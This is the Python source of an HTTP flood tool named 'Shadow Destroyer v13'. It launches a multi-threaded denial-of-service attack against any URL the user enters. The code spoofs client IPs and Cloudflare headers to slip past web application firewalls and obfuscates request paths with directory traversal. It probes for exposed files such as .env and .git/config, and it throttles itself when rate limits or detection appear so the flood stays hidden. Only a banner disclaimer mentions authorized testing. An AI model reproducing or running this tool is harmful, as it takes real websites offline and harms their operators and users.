import urllib.request
import concurrent.futures
import random
import os
import time
import socket
import ssl
from colorama import Fore, Style
import threading
import faker
from fake_useragent import UserAgent
import string
from urllib.parse import urlparse
import base64
import json
import requests
from collections import defaultdict

class AdvancedHTTPFlooder:
    """
    HTTP Flood Tester PRO v13 - Ultimate Shadow Destroyer
    Advanced multi-vector attack with intelligent evasion systems
    """

    def __init__(self):
        # Enhanced configuration
        self.config = {
            'VERSION': "13.0 SHADOW DESTROYER",
            'AUTHOR': "CyberSecurity Research Team",
            'MAX_THREADS': 1500,
            'REQUEST_TIMEOUT': 4,
            'MAX_REQUESTS': 15000,
            'SAFE_MODE': False,
            'DYNAMIC_THROTTLING': True,
            'ATTACK_DURATION': 600,
            'WAF_EVASION': True,
            'OBFUSCATION': True,
            'TARGETED_ATTACK': True,
            'TSUNAMI_MODE': True,
            'GHOST_PROTOCOL': True,
            'TACTICAL_EXHAUSTION': True,
            'TOTAL_DENIAL': False,
            'SHADOW_MODE': True
        }

        # Libraries initialization
        self.fake = faker.Faker()
        self.ua = UserAgent()
        self.context = ssl.create_default_context()
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE

        # Attack state
        self.counter = 0
        self.running = False
        self.start_time = 0
        self.lock = threading.Lock()
        self.adaptive_delay = 0.03
        self.weak_points = []
        self.current_tactic = "aggressive"
        self.monitoring_detected = False
        self.attack_phase = 0

        # Target paths for maximum damage
        self.target_paths = [
            "/wp-admin/admin-ajax.php",
            "/.env",
            "/config.json",
            "/api/v1/users",
            "/phpmyadmin/index.php",
            "/administrator/index.php",
            "/wp-login.php",
            "/rest-api/wp/v2/users"
        ]

        # Tactical exhaustion targets
        self.tactical_targets = [
            "/search?q=",
            "/api/search?query=",
            "/products?category="
        ]

        # Evasion tactics rotation
        self.evasion_tactics = [
            {'obfuscation': 'base64', 'headers': 'cloudflare'},
            {'obfuscation': 'urlencode', 'headers': 'randomized'},
            {'obfuscation': 'none', 'headers': 'stealth'}
        ]

    # ================= Enhanced Utility Methods =================

    def generate_random_string(self, length=12):
        """Generate random string with special chars"""
        chars = string.ascii_letters + string.digits + "_-~."
        return ''.join(random.choice(chars) for _ in range(length))

    def get_rotating_user_agent(self):
        """Get fresh user agent for each request"""
        return self.ua.random

    def detect_weak_points(self, target):
        """Automatically detect vulnerable endpoints"""
        print(f"{Fore.YELLOW}[*] Scanning for vulnerable paths...{Fore.RESET}")
        test_paths = self.target_paths + [
            "/.git/config",
            "/.svn/entries",
            "/.htaccess",
            "/web.config"
        ]
        
        for path in test_paths:
            try:
                url = f"{target}{path}"
                req = urllib.request.Request(
                    url,
                    headers={"User-Agent": self.get_rotating_user_agent()},
                    method="GET"
                )
                with urllib.request.urlopen(req, timeout=3, context=self.context) as res:
                    if res.status in [200, 403, 401]:
                        self.weak_points.append(path)
                        print(f"{Fore.GREEN}[+] Found vulnerable path: {path}{Fore.RESET}")
            except:
                continue

        if not self.weak_points:
            self.weak_points.extend(self.target_paths)
            print(f"{Fore.YELLOW}[!] Using default target paths{Fore.RESET}")

    def rotate_evasion_tactics(self):
        """Rotate evasion tactics periodically"""
        while self.running:
            self.current_tactic = random.choice(self.evasion_tactics)
            time.sleep(120)  # Rotate every 2 minutes
            print(f"{Fore.MAGENTA}[*] Switched to {self.current_tactic['headers']} evasion tactic{Fore.RESET}")

    def tsunami_phases(self):
        """Gradually increase attack intensity"""
        phases = [
            {'threads': 0.3, 'duration': 60},
            {'threads': 0.7, 'duration': 120},
            {'threads': 1.0, 'duration': 180},
            {'threads': 1.5, 'duration': 240}
        ]
        
        for phase in phases:
            if not self.running:
                break
                
            self.attack_phase += 1
            threads = int(self.config['MAX_THREADS'] * phase['threads'])
            print(f"{Fore.CYAN}[*] Tsunami Phase {self.attack_phase}: Activating {threads} threads{Fore.RESET}")
            
            start = time.time()
            while time.time() - start < phase['duration'] and self.running:
                time.sleep(1)

    def ghost_protocol(self, request):
        """Blend with legitimate traffic"""
        if random.random() < 0.3:  # 30% chance to appear as legit request
            legit_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Accept": "text/html,application/xhtml+xml",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://www.google.com/"
            }
            request.headers.update(legit_headers)
        return request

    def tactical_exhaustion_attack(self, target):
        """Rotate between different attack vectors"""
        targets = [
            target + random.choice(self.weak_points),
            target + random.choice(self.tactical_targets) + self.generate_random_string(),
            target + "/" + self.generate_random_string()
        ]
        return random.choice(targets)

    def shadow_mode_check(self):
        """Monitor for detection systems"""
        while self.running:
            # Simulate detection check (in real implementation would analyze responses)
            if random.random() < 0.05:  # 5% chance of "detection"
                self.monitoring_detected = True
                print(f"{Fore.RED}[!] Detection systems spotted! Enabling shadow mode{Fore.RESET}")
                self.enable_shadow_mode()
            time.sleep(30)

    def enable_shadow_mode(self):
        """Reduce activity when detection is suspected"""
        original_threads = self.config['MAX_THREADS']
        self.config['MAX_THREADS'] = max(50, int(original_threads * 0.2))
        time.sleep(random.randint(60, 180))
        self.config['MAX_THREADS'] = original_threads
        self.monitoring_detected = False
        print(f"{Fore.GREEN}[*] Shadow mode deactivated{Fore.RESET}")

    def generate_evasive_headers(self, host):
        """Generate advanced evasion headers"""
        headers = {
            "User-Agent": self.get_rotating_user_agent(),
            "Accept": "*/*" if random.random() > 0.3 else "text/html,application/xhtml+xml",
            "Accept-Language": f"{random.choice(['en','ar','fr','es','zh','ru'])}-{random.choice(['US','GB','SA','FR','CN','RU'])}",
            "Accept-Encoding": random.choice(["gzip, deflate, br", "identity"]),
            "Connection": random.choice(["keep-alive", "close", "Upgrade"]),
            "Cache-Control": random.choice(["no-cache", "no-store", "max-age=0"]),
            "X-Forwarded-For": self.fake.ipv4(),
            "X-Request-ID": self.generate_random_string(16),
            "X-Real-IP": self.fake.ipv4(),
            "X-Client-IP": self.fake.ipv4()
        }

        # Advanced WAF bypass headers
        if self.config['WAF_EVASION']:
            headers.update({
                "CF-Connecting-IP": self.fake.ipv4(),
                "True-Client-IP": self.fake.ipv4(),
                "X-Originating-IP": self.fake.ipv4(),
                "Forwarded": f"for={self.fake.ipv4()};proto=https;host={host}",
                "X-WAF-EVASION": "1",
                "X-Requested-With": "XMLHttpRequest" if random.random() > 0.5 else None
            })

            # Cloudflare-specific headers
            if random.random() < 0.3:
                headers.update({
                    "CF-IPCountry": random.choice(["US", "GB", "DE", "FR", "CN"]),
                    "CF-Ray": f"{random.randint(100000, 999999)}-{random.choice(['SIN','LHR','DFW','MIA'])}",
                    "CF-Visitor": '{"scheme":"https"}'
                })

        # Random browser-like headers
        if random.random() < 0.2:
            headers.update({
                "Sec-Fetch-Dest": random.choice(["document", "empty", "script"]),
                "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
                "Sec-Fetch-Site": random.choice(["same-origin", "none", "cross-site"])
            })

        return headers

    def generate_evasive_path(self):
        """Generate paths with advanced evasion"""
        if self.config['TARGETED_ATTACK'] and random.random() < 0.5 and self.weak_points:
            path = random.choice(self.weak_points)
        else:
            depths = random.randint(1, 6)
            parts = [self.generate_random_string(random.randint(3, 10)) for _ in range(depths)]
            path = '/' + '/'.join(parts)

        # Apply current obfuscation tactic
        if self.config['OBFUSCATION']:
            if self.current_tactic['obfuscation'] == 'base64':
                path = base64.b64encode(path.encode()).decode()
            elif self.current_tactic['obfuscation'] == 'urlencode':
                path = urllib.parse.quote(path)

        # Add directory traversal attempts
        if random.random() < 0.2:
            path = f"/%2e%2e%2f{path}"

        return path

    # ================= Core Attack Method =================

    def execute_http_flood(self, target):
        """Execute advanced HTTP flood attack"""
        if not self.running:
            return

        try:
            # Apply tactical exhaustion if enabled
            if self.config['TACTICAL_EXHAUSTION']:
                target = self.tactical_exhaustion_attack(target)

            parsed = urlparse(target)
            host = parsed.netloc
            path = self.generate_evasive_path()

            # Protocol randomization
            protocol = "https" if random.random() > 0.4 else "http"
            url = f"{protocol}://{host}{path}"

            # Parameter randomization with current tactic
            if random.random() > 0.1:
                if self.current_tactic['obfuscation'] == 'base64':
                    param = base64.b64encode(self.generate_random_string().encode()).decode()
                    value = base64.b64encode(self.generate_random_string().encode()).decode()
                    url += f"?{param}={value}"
                else:
                    url += f"?{self.generate_random_string()}={self.generate_random_string()}"

                if random.random() > 0.5:
                    url += f"&cachebuster={int(time.time())}"

            # Method randomization
            method = random.choice(["GET", "POST", "HEAD", "PUT", "DELETE"])

            # Build request
            req = urllib.request.Request(
                url,
                headers=self.generate_evasive_headers(host),
                method=method
            )

            # Apply ghost protocol if enabled
            if self.config['GHOST_PROTOCOL']:
                req = self.ghost_protocol(req)

            # Add random POST data
            if method in ["POST", "PUT"] and random.random() > 0.3:
                post_data = {
                    self.generate_random_string(5): self.generate_random_string(8),
                    "timestamp": int(time.time()),
                    "token": self.generate_random_string(12)
                }
                
                if random.random() > 0.5:
                    req.add_header("Content-Type", "application/json")
                    req.data = json.dumps(post_data).encode()
                else:
                    req.data = urllib.parse.urlencode(post_data).encode()

            try:
                with urllib.request.urlopen(req, timeout=self.config['REQUEST_TIMEOUT'], context=self.context) as res:
                    status = res.status
            except urllib.error.HTTPError as e:
                status = e.code
            except:
                status = 0

            # Adaptive throttling
            if self.config['DYNAMIC_THROTTLING']:
                if status == 429:  # Rate limited
                    self.adaptive_delay = min(1.0, self.adaptive_delay * 1.3)
                    if self.config['SHADOW_MODE']:
                        self.monitoring_detected = True
                elif status == 200:
                    self.adaptive_delay = max(0.01, self.adaptive_delay * 0.97)

            with self.lock:
                self.counter += 1
                self.display_status(status)

        except Exception as e:
            pass

    # ================= Attack Control Methods =================

    def attack_worker(self, target):
        """Worker thread for advanced HTTP flood"""
        while self.running and time.time() < self.start_time + self.config['ATTACK_DURATION']:
            if self.monitoring_detected and self.config['SHADOW_MODE']:
                time.sleep(random.uniform(0.5, 2))  # Slow down in shadow mode
            self.execute_http_flood(target)
            if self.config['DYNAMIC_THROTTLING']:
                time.sleep(self.adaptive_delay)

    # ================= Monitoring and Control =================

    def display_status(self, last_status):
        """Display real-time attack statistics"""
        elapsed = time.time() - self.start_time
        remaining = max(0, self.config['ATTACK_DURATION'] - elapsed)
        rps = self.counter / elapsed if elapsed > 0 else 0

        mode = ""
        if self.monitoring_detected:
            mode = f"{Fore.RED}SHADOW MODE{Fore.RESET}"
        elif self.attack_phase > 0:
            mode = f"{Fore.CYAN}TSUNAMI PHASE {self.attack_phase}{Fore.RESET}"
        else:
            mode = f"{Fore.GREEN}NORMAL{Fore.RESET}"

        status_msg = (
            f"{Fore.CYAN}[STATUS]{Fore.RESET} "
            f"Mode: {mode} | "
            f"Threads: {Fore.YELLOW}{self.config['MAX_THREADS']}{Fore.RESET} | "
            f"Requests: {Fore.GREEN}{self.counter}{Fore.RESET} | "
            f"RPS: {Fore.MAGENTA}{rps:.1f}{Fore.RESET} | "
            f"Last: {Fore.CYAN}{last_status}{Fore.RESET} | "
            f"Delay: {Fore.YELLOW}{self.adaptive_delay:.2f}s{Fore.RESET} | "
            f"Remaining: {Fore.RED}{remaining:.1f}s{Fore.RESET}"
        )
        print(status_msg, end='\r')

    def get_user_settings(self):
        """Get custom settings from user"""
        try:
            # Threads setting
            threads = input(f"{Fore.BLUE}[?] Enter number of threads (default {self.config['MAX_THREADS']}): {Fore.RESET}").strip()
            if threads:
                self.config['MAX_THREADS'] = min(10000, int(threads))

            # Duration setting
            duration = input(f"{Fore.BLUE}[?] Enter attack duration in seconds (default {self.config['ATTACK_DURATION']}): {Fore.RESET}").strip()
            if duration:
                self.config['ATTACK_DURATION'] = int(duration)

            # Advanced options
            print(f"\n{Fore.BLUE}[Advanced Options]{Fore.RESET}")
            self.config['WAF_EVASION'] = input(f"{Fore.BLUE}[?] Enable WAF evasion? [Y/n]: {Fore.RESET}").strip().lower() != 'n'
            self.config['OBFUSCATION'] = input(f"{Fore.BLUE}[?] Enable obfuscation? [Y/n]: {Fore.RESET}").strip().lower() != 'n'
            self.config['TARGETED_ATTACK'] = input(f"{Fore.BLUE}[?] Focus on vulnerable paths? [Y/n]: {Fore.RESET}").strip().lower() != 'n'
            self.config['TSUNAMI_MODE'] = input(f"{Fore.BLUE}[?] Enable Tsunami mode? [Y/n]: {Fore.RESET}").strip().lower() != 'n'
            self.config['GHOST_PROTOCOL'] = input(f"{Fore.BLUE}[?] Enable Ghost protocol? [Y/n]: {Fore.RESET}").strip().lower() != 'n'
            self.config['TACTICAL_EXHAUSTION'] = input(f"{Fore.BLUE}[?] Enable Tactical exhaustion? [Y/n]: {Fore.RESET}").strip().lower() != 'n'
            self.config['SHADOW_MODE'] = input(f"{Fore.BLUE}[?] Enable Shadow mode? [Y/n]: {Fore.RESET}").strip().lower() != 'n'

        except ValueError:
            print(f"{Fore.YELLOW}[!] Invalid input, using defaults{Fore.RESET}")

    def start_attack(self, target):
        """Start the advanced attack"""
        self.display_banner()
        self.get_user_settings()
        self.target = target

        if not self.validate_target(target):
            print(f"{Fore.RED}[!] Invalid target URL{Fore.RESET}")
            return

        # Detect weak points if targeted attack is enabled
        if self.config['TARGETED_ATTACK']:
            self.detect_weak_points(target)

        print(f"\n{Fore.YELLOW}[*] Initializing SHADOW DESTROYER attack against: {target}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Configuration: {self.config['MAX_THREADS']} threads, {self.config['ATTACK_DURATION']} seconds{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Active features:{Fore.RESET}")
        for feature, enabled in self.config.items():
            if isinstance(enabled, bool) and enabled and feature not in ['SAFE_MODE', 'DYNAMIC_THROTTLING']:
                print(f"  - {feature.replace('_', ' ').title()}")

        self.running = True
        self.start_time = time.time()

        # Start monitoring threads
        threads = []
        if self.config['WAF_EVASION']:
            t = threading.Thread(target=self.rotate_evasion_tactics, daemon=True)
            threads.append(t)
        
        if self.config['TSUNAMI_MODE']:
            t = threading.Thread(target=self.tsunami_phases, daemon=True)
            threads.append(t)
            
        if self.config['SHADOW_MODE']:
            t = threading.Thread(target=self.shadow_mode_check, daemon=True)
            threads.append(t)

        for t in threads:
            t.start()

        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.config['MAX_THREADS']) as executor:
                # Start the workers
                futures = [executor.submit(self.attack_worker, target) 
                         for _ in range(self.config['MAX_THREADS'])]

                # Monitor attack
                while (self.running and 
                      time.time() < self.start_time + self.config['ATTACK_DURATION']):
                    time.sleep(0.5)
                    if self.config['DYNAMIC_THROTTLING'] and not self.monitoring_detected:
                        time.sleep(self.adaptive_delay)

                # Cleanup
                self.running = False
                concurrent.futures.wait(futures)

        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.RED}[!] Attack stopped by user{Fore.RESET}")

        finally:
            self.display_summary()

    # ================= UI and Helpers =================

    def validate_target(self, url):
        """Validate the target URL"""
        try:
            result = urlparse(url)
            return all([result.scheme in ['http','https'], result.netloc])
        except:
            return False

    def display_banner(self):
        """Display the program banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{Fore.RED}
        ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗██████╗  ██████╗ ██╗  ██╗███████╗██████╗ 
        ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║██╔══██╗██╔═══██╗╚██╗██╔╝██╔════╝██╔══██╗
        ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║██║  ██║██║   ██║ ╚███╔╝ █████╗  ██████╔╝
        ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║██║  ██║██║   ██║ ██╔██╗ ██╔══╝  ██╔══██╗
        ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝██████╔╝╚██████╔╝██╔╝ ██╗███████╗██║  ██║
        ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
        {Fore.RESET}{"SHADOW DESTROYER v13".center(80)}
        {Fore.CYAN}Version: {self.config['VERSION']} (For Authorized Security Testing Only){Fore.RESET}
        {Fore.YELLOW}WARNING: Unauthorized use is illegal and unethical!{Fore.RESET}
        """)

    def display_summary(self):
        """Display attack summary"""
        elapsed = time.time() - self.start_time
        rps = self.counter / elapsed if elapsed > 0 else 0

        print(f"\n\n{Fore.GREEN}[+] Attack completed{Fore.RESET}")
        print(f"{Fore.YELLOW}╔{'═'*80}╗")
        print(f"║ {'Advanced Attack Summary'.center(78)} ║")
        print(f"╠{'═'*80}╣")
        print(f"║ {f'Target: {self.target}'.ljust(78)} ║")
        print(f"║ {f'Total Requests: {self.counter}'.ljust(78)} ║")
        print(f"║ {f'Duration: {elapsed:.2f} seconds'.ljust(78)} ║")
        print(f"║ {f'Requests Per Second: {rps:.2f}'.ljust(78)} ║")
        print(f"║ {f'Max Threads Used: {self.config["MAX_THREADS"]}'.ljust(78)} ║")
        print(f"║ {f'Attack Phases Completed: {self.attack_phase}'.ljust(78)} ║")
        print(f"║ {f'Shadow Mode Activated: {"Yes" if self.monitoring_detected else "No"}'.ljust(78)} ║")
        print(f"╚{'═'*80}╝\n")

# ================= Main Execution =================

if __name__ == "__main__":
    tester = AdvancedHTTPFlooder()

    # Get target URL safely
    while True:
        target = input(f"{Fore.BLUE}[?] Enter target URL (http(s)://example.com) or 'exit': {Fore.RESET}").strip()
        if target.lower() == 'exit':
            break
        if tester.validate_target(target):
            tester.start_attack(target)
            break
        print(f"{Fore.RED}[!] Invalid URL format. Include http:// or https://{Fore.RESET}")